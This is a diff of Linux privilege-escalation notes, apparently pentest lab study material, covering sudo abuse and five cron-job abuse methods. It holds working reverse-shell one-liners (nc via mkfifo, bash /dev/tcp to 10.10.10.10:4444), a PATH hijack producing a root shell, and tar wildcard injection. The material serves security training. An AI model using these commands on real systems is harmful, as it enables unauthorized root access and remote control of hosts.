@@ -336,7 +336,7 @@ User edward may run the following commands on straylight:
 su gives a root shell:
 ```
 
-### Abusing Sudo
+## Abusing Sudo
 ```
 Abusing sudo
 Can sudo but absolute path is specified? Use ltrace to view libraries being loaded by these programs and check if absolute path is specified or not
@@ -759,8 +759,9 @@ Example of cron job definition:
             |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
             |  |  |  |  |
             *  *  *  *  * user-name  command to be executed
-
-Cron Abuse
+```
+## Cron Abuse 1
+```
 1. user_backups.sh
 grep "CRON" /var/log/syslog
 Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/mute/.scripts/user_backups.sh)  ← Vulnerable .sh cronjob running as root
@@ -770,7 +771,9 @@ Since an unprivileged user can modify the contents of the backup script, we can 
 echo >> user_backups.sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.156 4444 >/tmp/f" >> user_backups.sh
 All we have to do now is set up a listener on our Kali Linux machine and wait for the cron job to execute.
-
+```
+## Cron Abuse 2
+```
  2. overwrite.sh
 Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
 View the contents of the system-wide crontab:
@@ -788,7 +791,10 @@ Replace the contents of the overwrite.sh file with the following after changing 
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
 Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute).
+```
 
+## Cron Abuse 3
+```
 3. (Path Abuse)
 View the contents of the system-wide crontab:
 cat /etc/crontab
@@ -807,7 +813,10 @@ chmod +x /home/user/overwrite.sh
 
 Wait for the cron job to run (should not take longer than a minute).
 Run the /tmp/rootbash command with -p to gain a shell running with root privileges.
+```
 
+## Cron Abuse 4
+```
 4. Wildcard
 View the contents of the other cron job script:
 cat /usr/local/bin/compress.sh
@@ -831,7 +840,10 @@ When the tar command in the cron job runs, the wildcard (*) will expand to inclu
 Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
 Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
 nc -nvlp 4444
+```
 
+## Cron Abuse 5
+```
 5. PhP Poisoning
 -rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab 
 * * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
